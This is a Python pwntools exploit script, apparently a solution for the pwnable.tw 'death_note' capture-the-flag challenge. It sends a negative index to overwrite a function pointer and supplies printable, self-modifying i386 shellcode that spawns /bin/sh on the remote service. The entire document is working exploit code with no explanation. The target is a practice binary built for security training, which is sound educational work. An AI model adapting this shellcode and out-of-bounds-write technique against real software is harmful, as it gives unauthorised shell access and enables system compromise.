import pwn
import time

LOCAL = 0
if LOCAL:
    p = pwn.process("./death_note")
else:
    p = pwn.remote('chall.pwnable.tw', 10201)
pwn.context.arch = "i386"
sc = (
    pwn.asm(
        """
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx

    push edx
    pop eax
    push 0x53
    pop edx
    sub byte ptr [eax+39],dl
    sub byte ptr [eax+40],dl
    push 0x70
    pop edx
    xor byte ptr [eax+40],dl

    push ecx
    pop eax
    xor al, 0x20
    xor al, 0x2b

    push ecx
    pop edx
"""
    )
    + b"\x20\x43"
)
p.sendlineafter(b'Your choice :', b'1')
p.sendlineafter(b'Index :', b'-16')
#pwn.gdb.attach(p)
p.sendlineafter(b'Name :', sc)
p.interactive()
